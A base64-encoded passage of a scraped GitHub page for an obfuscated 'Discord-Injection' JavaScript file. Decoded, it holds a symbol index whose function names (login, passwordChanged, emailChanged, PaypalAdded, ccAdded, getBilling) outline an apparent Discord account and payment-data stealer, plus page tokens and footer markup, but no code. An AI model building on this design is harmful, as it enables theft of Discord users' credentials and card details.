U51bWJlciI6MCwidXRmMTZDb2wiOjE0MTQ5fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNDQ0NH19fSx7Im5hbWUiOiJmZXRjaEJpbGxpbmciLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxNDQ0NywiaWRlbnRFbmQiOjE0NDU5LCJleHRlbnRTdGFydCI6MTQ0NDcsImV4dGVudEVuZCI6MTQ2MDgsImZ1bGx5UXVhbGlmaWVkTmFtZSI6ImZldGNoQmlsbGluZyIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0NDQ1fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNDQ1N319LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQ0NDV9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0NjA2fX19LHsibmFtZSI6ImdldEJpbGxpbmciLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxNDYwOSwiaWRlbnRFbmQiOjE0NjE5LCJleHRlbnRTdGFydCI6MTQ2MDksImV4dGVudEVuZCI6MTQ5MTksImZ1bGx5UXVhbGlmaWVkTmFtZSI6ImdldEJpbGxpbmciLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNDYwN30sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQ2MTd9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0NjA3fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNDkxMX19fSx7Im5hbWUiOiJQdXJjaGFzZSIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjE0OTIwLCJpZGVudEVuZCI6MTQ5MjgsImV4dGVudFN0YXJ0IjoxNDkyMCwiZXh0ZW50RW5kIjoxNTQzNCwiZnVsbHlRdWFsaWZpZWROYW1lIjoiUHVyY2hhc2UiLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNDkxMn0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQ5MjB9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0OTEyfSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNTQyNn19fSx7Im5hbWUiOiJidXlOaXRybyIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjE1NDM1LCJpZGVudEVuZCI6MTU0NDMsImV4dGVudFN0YXJ0IjoxNTQzNSwiZXh0ZW50RW5kIjoxNTc5OCwiZnVsbHlRdWFsaWZpZWROYW1lIjoiYnV5Tml0cm8iLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNTQyN30sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTU0MzV9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE1NDI3fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNTc5MH19fSx7Im5hbWUiOiJnZXROaXRybyIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjE1Nzk5LCJpZGVudEVuZCI6MTU4MDcsImV4dGVudFN0YXJ0IjoxNTc5OSwiZXh0ZW50RW5kIjoxNTk1NiwiZnVsbHlRdWFsaWZpZWROYW1lIjoiZ2V0Tml0cm8iLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNTc5MX0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTU3OTl9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE1NzkxfSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNTk0OH19fSx7Im5hbWUiOiJnZXRCYWRnZXMiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxNTk1NywiaWRlbnRFbmQiOjE1OTY2LCJleHRlbnRTdGFydCI6MTU5NTcsImV4dGVudEVuZCI6MTY1OTUsImZ1bGx5UXVhbGlmaWVkTmFtZSI6ImdldEJhZGdlcyIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE1OTQ5fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNTk1OH19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTU5NDl9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE2NTg3fX19LHsibmFtZSI6Imhvb2tlciIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjE2NTk2LCJpZGVudEVuZCI6MTY2MDIsImV4dGVudFN0YXJ0IjoxNjU5NiwiZXh0ZW50RW5kIjoxNzIzMywiZnVsbHlRdWFsaWZpZWROYW1lIjoiaG9va2VyIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTY1ODh9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE2NTk0fX0sImV4dGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNjU4OH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTcyMjV9fX0seyJuYW1lIjoibG9naW4iLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxNzIzNCwiaWRlbnRFbmQiOjE3MjM5LCJleHRlbnRTdGFydCI6MTcyMzQsImV4dGVudEVuZCI6MTc4NDgsImZ1bGx5UXVhbGlmaWVkTmFtZSI6ImxvZ2luIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTcyMjZ9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE3MjMxfX0sImV4dGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNzIyNn0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTc4NDB9fX0seyJuYW1lIjoicGFzc3dvcmRDaGFuZ2VkIiwia2luZCI6ImZ1bmN0aW9uIiwiaWRlbnRTdGFydCI6MTc4NDksImlkZW50RW5kIjoxNzg2NCwiZXh0ZW50U3RhcnQiOjE3ODQ5LCJleHRlbnRFbmQiOjE4NTI0LCJmdWxseVF1YWxpZmllZE5hbWUiOiJwYXNzd29yZENoYW5nZWQiLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNzg0MX0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTc4NTZ9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE3ODQxfSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxODUxNn19fSx7Im5hbWUiOiJlbWFpbENoYW5nZWQiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxODUyNSwiaWRlbnRFbmQiOjE4NTM3LCJleHRlbnRTdGFydCI6MTg1MjUsImV4dGVudEVuZCI6MTkxODEsImZ1bGx5UXVhbGlmaWVkTmFtZSI6ImVtYWlsQ2hhbmdlZCIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE4NTE3fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxODUyOX19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTg1MTd9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE5MTczfX19LHsibmFtZSI6IlBheXBhbEFkZGVkIiwia2luZCI6ImZ1bmN0aW9uIiwiaWRlbnRTdGFydCI6MTkxODIsImlkZW50RW5kIjoxOTE5MywiZXh0ZW50U3RhcnQiOjE5MTgyLCJleHRlbnRFbmQiOjE5ODE5LCJmdWxseVF1YWxpZmllZE5hbWUiOiJQYXlwYWxBZGRlZCIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE5MTc0fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxOTE4NX19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTkxNzR9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE5ODA5fX19LHsibmFtZSI6ImNjQWRkZWQiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxOTgyMCwiaWRlbnRFbmQiOjE5ODI3LCJleHRlbnRTdGFydCI6MTk4MjAsImV4dGVudEVuZCI6MjA0NzcsImZ1bGx5UXVhbGlmaWVkTmFtZSI6ImNjQWRkZWQiLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxOTgxMH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTk4MTd9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE5ODEwfSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoyMDQ2N319fSx7Im5hbWUiOiJuaXRyb0JvdWdodCIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjIwNDc4LCJpZGVudEVuZCI6MjA0ODksImV4dGVudFN0YXJ0IjoyMDQ3OCwiZXh0ZW50RW5kIjoyMTE1MiwiZnVsbHlRdWFsaWZpZWROYW1lIjoibml0cm9Cb3VnaHQiLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoyMDQ2OH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjA0Nzl9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjIwNDY4fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoyMTE0Mn19fV19fSwiY29waWxvdEluZm8iOm51bGwsImNvcGlsb3RBY2Nlc3NBbGxvd2VkIjpmYWxzZSwiY3NyZl90b2tlbnMiOnsiL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9icmFuY2hlcyI6eyJwb3N0Ijoic01ValR5ZDdORmRHOWhXME1faG5wN04xSV9OYl8zb256X0JLaXZRVWlLTjBySmhEVFNGUV90dTM2aVNxUXRmOWgxU2phUEJxYkt2cU5TZXdyd1RRT2cifSwiL3JlcG9zL3ByZWZlcmVuY2VzIjp7InBvc3QiOiJDNDIwdkxmaUdFYlRMSmtYZUhxaUp3Q3Mwamc5VVhFYWRnQlVHejREb01Wd0ZTYk9fb0tuSC1FYjVPSHVKRU1JQUhwRnZyUS1MZjJ3Q3ZmMmFlWDI1ZyJ9fX0sInRpdGxlIjoiRGlzY29yZC1JbmplY3Rpb24vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMgYXQgbWFpbiDCtyBza29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24iLCJhcHBQYXlsb2FkIjp7ImhlbHBVcmwiOiJodHRwczovL2RvY3MuZ2l0aHViLmNvbSIsImZpbmRGaWxlV29ya2VyUGF0aCI6Ii9hc3NldHMtY2RuL3dvcmtlci9maW5kLWZpbGUtd29ya2VyLTMyYmIxNTljYzU3Yy5qcyIsImZpbmRJbkZpbGVXb3JrZXJQYXRoIjoiL2Fzc2V0cy1jZG4vd29ya2VyL2ZpbmQtaW4tZmlsZS13b3JrZXItY2U2ZDVjMTVkMmExLmpzIiwiZ2l0aHViRGV2VXJsIjpudWxsLCJlbmFibGVkX2ZlYXR1cmVzIjp7ImNvZGVfbmF2X3VpX2V2ZW50cyI6ZmFsc2UsImNvcGlsb3RfY29udmVyc2F0aW9uYWxfdXgiOmZhbHNlLCJjb3BpbG90X2NvbnZlcnNhdGlvbmFsX3V4X2VtYmVkZGluZ191cGRhdGUiOmZhbHNlLCJjb3BpbG90X2NvbnZlcnNhdGlvbmFsX3V4X3N0cmVhbWluZyI6ZmFsc2UsImNvcGlsb3RfcG9wb3Zlcl9maWxlX2VkaXRvcl9oZWFkZXIiOmZhbHNlLCJjb3BpbG90X3NtZWxsX2ljZWJyZWFrZXJfdXgiOmZhbHNlfX19PC9zY3JpcHQ+CiAgPGRpdiBkYXRhLXRhcmdldD0icmVhY3QtYXBwLnJlYWN0Um9vdCI+PC9kaXY+CjwvcmVhY3QtYXBwPgo8L3R1cmJvLWZyYW1lPgoKCgogIDwvZGl2PgoKPC90dXJiby1mcmFtZT4KCiAgICA8L21haW4+CiAgPC9kaXY+CgogIDwvZGl2PgoKICAgICAgICAgIDxmb290ZXIgY2xhc3M9ImZvb3RlciB3aWR0aC1mdWxsIGNvbnRhaW5lci14bCBwLXJlc3BvbnNpdmUiIHJvbGU9ImNvbnRlbnRpbmZvIj4KICA8aDIgY2xhc3M9J3NyLW9ubHknPkZvb3RlcjwvaDI+CgogIDxkaXYgY2xhc3M9InBvc2l0aW9uLXJlbGF0aXZlIGQtZmxleCBmbGV4LWl0ZW1zLWNlbnRlciBwYi0yIGY2IGNvbG9yLWZnLW11dGVkIGJvcmRlci10b3AgY29sb3ItYm9yZGVyLW11dGVkIGZsZXgtY29sdW1uLXJldmVyc2UgZmxleC1sZy1yb3cgZmxleC13cmFwIGZsZXgtbGctbm93cmFwIG10LTYgcHQtNiI+CiAgICA8ZGl2IGNsYXNzPSJsaXN0LXN0eWxlLW5vbmUgZC1mbGV4IGZsZXgtd3JhcCBjb2wtMCBjb2wtbGctMiBmbGV4LWp1c3RpZnktc3RhcnQgZmxleC1sZy1qdXN0aWZ5LWJldHdlZW4gbWItMiBtYi1sZy0wIj4KICAgICAgPGRpdiBjbGFzcz0ibXQtMiBtdC1sZy0wIGQtZmxleCBmbGV4LWl0ZW1zLWNlbnRlciI+CiAgICAgICAgPGEgYXJpYS1sYWJlbD0iSG9tZXBhZ2UiIHRpdGxlPSJHaXRIdWIiIGNsYXNzPSJmb290ZXItb2N0aWNvbiBtci0yIiBocmVmPSJodHRwczovL2dpdGh1Yi5jb20iPgogICAgICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIyNCIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1tYXJrLWdpdGh1YiI+CiAgICA8cGF0aCBkPSJNOCAwYzQuNDIgMCA4IDMuNTggOCA4YTguMDEzIDguMDEzIDAgMCAxLTUuNDUgNy41OWMtLjQuMDgtLjU1LS4xNy0uNTUtLjM4IDAtLjI3LjAxLTEuMTMuMDEtMi4yIDAtLjc1LS4yNS0xLjIzLS41NC0xLjQ4IDEuNzgtLjIgMy42NS0uODggMy42NS0zLjk1IDAtLjg4LS4zMS0xLjU5LS44Mi0yLjE1LjA4LS4yLjM2LTEuMDItLjA4LTIuMTIgMCAwLS42Ny0uMjItMi4yLjgyLS42NC0uMTgtMS4zMi0uMjctMi0uMjctLjY4IDAtMS4zNi4wOS0yIC4yNy0xLjUzLTEuMDMtMi4yLS44Mi0yLjItLjgyLS40NCAxLjEtLjE2IDEuOTItLjA4IDIuMTItLjUxLjU2LS44MiAxLjI4LS44MiAyLjE1IDAgMy4wNiAxLjg2IDMuNzUgMy42NCAzLjk1LS4yMy4yLS40NC41NS0uNTEgMS4wNy0uNDYuMjEtMS42MS41NS0yLjMzLS42Ni0uMTUtLjI0LS42LS44My0xLjIzLS44Mi0uNjcuMDEtLjI3LjM4LjAxLjUzLjM0LjE5LjczLjkuODIgMS4xMy4xNi40NS42OCAxLjMxIDIuNjkuOTQgMCAuNjcuMDEgMS4zLjAxIDEuNDkgMCAuMjEtLjE1LjQ1LS41NS4zOEE3Ljk5NSA3Ljk5NSAwIDAgMSAwIDhjMC00LjQyIDMuNTgtOCA4LThaIj48L3BhdGg+Cjwvc3ZnPgo8L2E+ICAgICAgICA8c3Bhbj4KICAgICAgICAmY29weTsgMjAyMyBHaXRIdWIsIEluYy4KICAgICAgICA8L3NwYW4+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPG5hdiBhcmlhLWxhYmVsPSdGb290ZXInIGNsYXNzPSJjb2wtMTIgY29sLWxnLTgiPgogICAgICA8aDMgY2xhc3M9J3NyLW9ubHknIGlkPSdzci1mb290ZXItaGVhZGluZyc+Rm9vdGVyIG5hdmlnYXRpb248L2gzPgogICAgICA8dWwgY2xhc3M9Imxpc3Qtc3R5bGUtbm9uZSBkLWZsZXggZmxleC13cmFwIGNvbC0xMiBmbGV4LWp1c3RpZnktY2VudGVyIGZsZXgtbGctanVzdGlmeS1iZXR3ZWVuIG1iLTIgbWItbGctMCIgYXJpYS1sYWJlbGxlZGJ5PSdzci1mb290ZXItaGVhZGluZyc+CiAgICAgICAgICA8bGkgY2xhc3M9Im1yLTMgbXItbGctMCI+PGEgaHJlZj0iaHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vc2l0ZS1wb2xpY3kvZ2l0aHViLXRlcm1zL2dpdGh1Yi10ZXJtcy1vZi1zZXJ2aWNlIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0Zvb3RlciZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Z28gdG8gdGVybXMmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7dGV4dDp0ZXJtcyZxdW90O30iPlRlcm1zPC9hPjwvbGk+CiAgICAgICAgICA8bGkgY2xhc3M9Im1yLTMgbXItbGctMCI+PGEgaHJlZj0iaHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vc2l0ZS1wb2xpY3kvcHJpdmFjeS1wb2xpY2llcy9naXRodWItcHJpdmFjeS1zdGF0ZW1lbnQiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7Rm9vdGVyJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtnbyB0byBwcml2YWN5JnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3RleHQ6cHJpdmFjeSZxdW90O30iPlByaXZhY3k8L2E+PC9saT4KICAgICAgICAgIDxsaSBjbGFzcz0ibXItMyBtci1sZy0wIj48YSBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0Zvb3RlciZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Z28gdG8gc2VjdXJpdHkmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7dGV4dDpzZWN1cml0eSZxdW90O30iIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9zZWN1cml0eSI+U2VjdXJpdHk8L2E+PC9saT4KICAgICAgICAgIDxsaSBjbGFzcz0ibXItMyBtci1sZy0wIj48YSBocmVmPSJodHRwczovL3d3dy5naXRodWJzdGF0dXMuY29tLyIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtGb290ZXImcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2dvIHRvIHN0YXR1cyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDt0ZXh0OnN0YXR1cyZxdW90O30iPlN0YXR1czwvYT48L2xpPgogICAgICAgICAgPGxpIGNsYXNzPSJtci0zIG1yLWxnLTAiPjxhIGRhdGEtZ2EtY2xpY2s9IkZvb3RlciwgZ28gdG8gaGVscCwgdGV4dDpEb2NzIiBocmVmPSJodHRwczovL2RvY3MuZ2l0aHViLmNvbSI+RG9jczwvYT48L2xpPgogICAgICAgICAgPGxpIGNsYXNzPSJtci0zIG1yLWxnLTAiPjxhIGhyZWY9Imh0dHBzOi8vc3VwcG9ydC5naXRodWIuY29tP3RhZ3M9ZG90Y29tLWZvb3RlciIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtGb290ZXImcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2dvIHRvIGNvbnRhY3QmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7dGV4dDpjb250YWN0JnF1b3Q7fSI+Q29udGFjdCBHaXRIdWI8L2E+PC9saT4KICAgICAgICAgIDxsaSBjbGFzcz0ibXItMyBtci1sZy0wIj48YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vcHJpY2luZyIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtGb290ZXImcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2dvIHRvIFByaWNpbmcmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7dGV4dDpQcmljaW5nJnF1b3Q7fSI+UHJpY2luZzwvYT48L2xpPgogICAgICAgIDxsaSBjbGFzcz0ibXItMyBtci1sZy0wIj48YSBocmVmPSJodHRwczovL2RvY3MuZ2l0aHViLmNvbSIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtGb290ZXImcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2dvIHRvIGFwaSZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDt0ZXh0OmFwaSZxdW90O30iPkFQSTwvYT48L2xpPgogICAgICAgIDxsaSBjbGFzcz0ibXItMyBtci1sZy0wIj48YSBocmVmPSJodHRwczovL3NlcnZpY2VzLmdpdGh1Yi5jb20iIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7Rm9vdGVyJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtnbyB0byB0cmFpbmluZyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDt0ZXh0OnRyYWluaW5nJnF1b3Q7fSI+VHJhaW5pbmc8L2E+PC9saT4KICAgICAgICAgIDxsaSBjbGFzcz0ibXItMyBtci1sZy0wIj48YSBocmVmPSJodHRwczovL2dpdGh1Yi5ibG9nIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0Zvb3RlciZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Z28gdG8gYmxvZyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDt0ZXh0OmJsb2cmcXVvdDt9Ij5CbG9nPC9hPjwvbGk+CiAgICAgICAgICA8bGk+PGEgZGF0YS1nYS1jbGljaz0iRm9vdGVyLCBnbyB0byBhYm91dCwgdGV4dDphYm91dCIgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL2Fib3V0Ij5BYm91dDwvYT48L2xpPgogICAgICA8L3VsPgogICAgPC9uYXY+CiAgPC9kaXY+CgogIDxkaXYgY2xhc3M9ImQtZmxleCBmbGV4LWp1c3RpZnktY2VudGVyIHBiLTYiPgogICAgPHNwYW4gY2xhc3M9ImY2IGNvbG9yLWZnLW11dGVkIj48L3NwYW4+CiAgPC9kaXY+CjwvZm9vdGVyPgoKCgoKICA8ZGl2IGlkPSJhamF4LWVycm9yLW1lc3NhZ2UiIGNsYXNzPSJhamF4LWVycm9yLW1lc3NhZ2UgZmxhc2ggZmxhc2gtZXJyb3IiIGhpZGRlbj4KICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tYWxlcnQiPgogICAgPHBhdGggZD0iTTYuNDU3IDEuMDQ3Yy42NTktMS4yMzQgMi40MjctMS4yMzQgMy4wODYgMGw2LjA4MiAxMS4zNzhBMS43NSAxLjc1IDAgMCAxIDE0LjA4MiAxNUgxLjkxOGExLjc1IDEuNzUgMCAwIDEtMS41NDMtMi41NzVabTEuNzYzLjcwN2EuMjUuMjUgMCAwIDAtLjQ0IDBMMS42OTggMTMuMTMyYS4yNS4yNSAwIDAgMCAuMjIuMzY4aDEyLjE2NGEuMjUuMjUgMCAwIDAgLjIyLS4zNjhabS41MyAzLjk5NnYyLjVhLjc1Ljc1IDAgMCAxLTEuNSAwdi0yLjVhLjc1Ljc1IDAgMCAxIDEuNSAwWk05IDExYTEgMSAwIDEgMS0yIDAgMSAxIDAgMCAxIDIgMFoiPjwvcGF0aD4KPC9zdmc+CiAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImZsYXNoLWNsb3NlIGpzLWFqYXgtZXJyb3ItZGlzbWlzcyIgYXJpYS1sYWJlbD0iRGlzbWlzcyBlcnJvciI+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24teCI+CiAgICA8cGF0aCBkPSJNMy43MiAzLjcyYS43NS43NSAwIDAgMSAxLjA2IDBMOCA2Ljk0bDMuMjItMy4yMmEuNzQ5Ljc0OSAwIDAgMSAxLjI3NS4zMjYuNzQ5Ljc0OSAwIDAgMS0uMjE1LjczNEw5LjA2IDhsMy4yMiAzLjIyYS43NDkuNzQ5IDAgMCAxLS4zMjYgMS4yNzUuNzQ5Ljc0OSAwIDAgMS0uNzM0LS4yMTVMOCA5LjA2bC0zLjIyIDMuMjJhLjc1MS43NTEgMCAwIDEtMS4wNDItLjAxOC43NTEuNzUxIDAgMCAxLS4wMTgtMS4wNDJMNi45NCA4IDMuNzIgNC43OGEuNzUuNzUgMCAwIDEgMC0xLjA2WiI+PC9wYXRoPgo8L3N2Zz4KICAgIDwvYnV0dG9uPgogICAgWW91IGNhbuKAmXQgcGVyZm9ybSB0aGF0IGFjdGlvbiBhdCB0aGlzIHRpbWUuCiAgPC9kaXY+CgogICAgPHRlbXBsYXRlIGlkPSJzaXRlLWRldGFpbHMtZGlhbG9nIj4KICA8ZGV0YWlscyBjbGFzcz0iZGV0YWlscy1yZXNldCBkZXRhaWxzLW92ZXJsYXkgZGV0YWlscy1vdmVybGF5LWRhcmsgbGgtZGVmYXVsdCBjb2xvci1mZy1kZWZhdWx0IGh4X3JzbSIgb3Blbj4KICAgIDxzdW1tYXJ5IHJvbGU9ImJ1dHRvbiIgYXJpYS1sYWJlbD0iQ2xvc2UgZGlhbG9nIj48L3N1bW1hcnk+CiAgICA8ZGV0YWlscy1kaWFsb2cgY2xhc3M9IkJveCBCb3gtLW92ZXJsYXkgZC1mbGV4IGZsZXgtY29sdW1uIGFuaW0tZmFkZS1pbiBmYXN0IGh4X3JzbS1kaWFsb2cgaHhfcnNtLW1vZGFsIj4KICAgICAgPGJ1dHRvbiBjbGFzcz0iQm94LWJ0bi1vY3RpY29uIG0tMCBidG4tb2N0aWNvbiBwb3NpdGlvbi1hYnNvbHV0ZSByaWdodC0wIHRvcC0wIiB0eXBlPSJidXR0b24iIGFyaWEtbGFiZWw9IkNsb3NlIGRpYWxvZyIgZGF0YS1jbG9zZS1kaWFsb2c+CiAgICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi14Ij4KICAgIDx